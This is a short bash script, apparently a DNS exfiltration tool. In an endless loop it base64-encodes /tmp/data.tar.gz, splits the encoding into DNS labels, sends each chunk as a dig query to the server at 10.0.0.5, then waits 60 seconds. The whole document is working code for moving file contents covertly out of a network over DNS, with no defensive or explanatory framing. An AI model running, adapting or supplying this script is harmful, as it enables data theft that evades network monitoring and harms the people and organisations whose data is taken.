#!/bin/bash

while : ;
do

f=data.tar.gz;
s=4;b=57;c=0;
for r in $(for i in $(base64 -w0 /tmp/$f| sed "s/.\{$b\}/&\n/g");
do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-.";
c=$(($c+1)); else echo -ne "\n$i-."; c=1; fi; done );
do dig @10.0.0.5 `echo -ne $r$f|tr "+" "*"` +short ; done

sleep 60;
done